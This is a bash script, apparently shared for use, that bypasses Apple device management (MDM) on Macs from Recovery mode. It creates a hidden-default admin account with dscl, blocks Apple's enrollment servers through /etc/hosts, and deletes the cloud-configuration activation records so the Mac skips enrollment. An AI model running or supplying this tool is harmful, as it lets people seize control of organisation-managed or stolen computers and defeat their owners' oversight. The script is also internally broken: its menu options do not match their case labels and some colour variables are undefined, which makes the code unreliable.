#!/bin/bash
RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
PUR='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m'

# Запрашиваем пароль
read -s -p "Enter the password to execute the script: " enteredPassword

# Задайте ваш ожидаемый пароль
expectedPassword="r3bx6h98"

# Проверка пароля
if [ "$enteredPassword" != "$expectedPassword" ]; then
    echo -e "${RED}Incorrect password. Exiting.${NC}"
    exit 1
fi

echo -e "${CYAN}*-------------------*---------------------*${NC}"
echo -e "${RED}*          Mac MDM Bypass          *${NC}"
echo -e "${RED}*            By WINS94                *${NC}"
echo -e "${CYAN}*-------------------*---------------------*${NC}"
echo ""
PS3=‘Choose option (Виберете действие) '
options=("AutoBypass(Автоматический обход)" "Reboot")
select opt in "${options[@]}"; do
	case $opt in
	"Autoypass on Recovery")
		echo -e "${GRN}Bypass from Recovery(Обход через рекавери)"
		if [ -d "/Volumes/Macintosh HD - Data" ]; then
   			diskutil rename "Macintosh HD - Data" "Data"
		fi
		echo -e "${GRN}Create a new user / Cоздать нового пользователя"
        echo -e "${BLU}Press Enter to continue, Note: Leaving it blank will default to the automatic user / Нажмите enter для продолжения, если поле для имени пользователя оставить чистым то имя пользователя будет стандартным"
  		echo -e "Enter the username (Default: Apple) / Введите имя пользователя (Стандартное: Apple)"
		read realName
  		realName="${realName:= Apple}"
    	echo -e "${BLUE}Nhận username ${RED}WRITE WITHOUT SPACES / ВВОДИТЬ БЕЗ ПРОБЕЛОВ"
      	read username
		username="${username:=Apple}"
  		echo -e "${BLUE}Enter the password (default: 1234) / Придумайте пароль (Стандартный пароль: 1234)"
    	read passw
      	passw="${passw:=1234}"
		dscl_path='/Volumes/Data/private/var/db/dslocal/nodes/Default' 
        echo -e "${GREEN}Creating User / Создание пользователя"
  		# Create user
    	dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username"
      	dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UserShell "/bin/zsh"
	    dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" RealName "$realName"
	 	dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" RealName "$realName"
	    dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UniqueID "501"
	    dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" PrimaryGroupID "20"
		mkdir "/Volumes/Data/Users/$username"
	    dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" NFSHomeDirectory "/Users/$username"
	    dscl -f "$dscl_path" localhost -passwd "/Local/Default/Users/$username" "$passw"
	    dscl -f "$dscl_path" localhost -append "/Local/Default/Groups/admin" GroupMembership $username
		echo "0.0.0.0 deviceenrollment.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
		echo "0.0.0.0 mdmenrollment.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
		echo "0.0.0.0 iprofiles.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
        echo -e "${GREEN}Successfully blocked host / Успешно заблокированы хосты${NC}"
		# echo "Removing configuration profile / Удаление MDM профиля"
  	touch /Volumes/Data/private/var/db/.AppleSetupDone
        rm -rf /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
	rm -rf /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
	touch /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
	touch /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound
	echo -e "${CYAN}------ Autobypass SUCCESSFULLY / Обход прошел успешно! ------${NC}"
	echo -e "${CYAN}------ Exit Terminal , Reset Macbook and ENJOY ! ------${NC}"
	echo -e "${CYAN}------ Закройте терминал и перезагрузите Мак ! ------${NC}"
		break
		;;
    "Disable Notification (SIP)")
    	echo -e "${RED}Please Insert Your Password To Proceed / Пожалуйста ведите свой пароль${NC}"
        sudo rm /var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
        sudo rm /var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
        sudo touch /var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
        sudo touch /var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound
        break
        ;;
    "Disable Notification (Recovery)")
        rm -rf /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
	rm -rf /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
	touch /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
	touch /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound

        break
        ;;
	"Check MDM Enrollment Проверить статус MDM")
		echo ""
		echo -e "${GRN}Check MDM Enrollment. Error is success${NC}"
		echo ""
		echo -e "${RED}Please Insert Your Password To Proceed${NC}"
		echo ""
		sudo profiles show -type enrollment
		break
		;;
	"Exit")
 		echo "Rebooting..."
		reboot
		break
		;;
	*) echo "Invalid option $REPLY" ;;
	esac
done
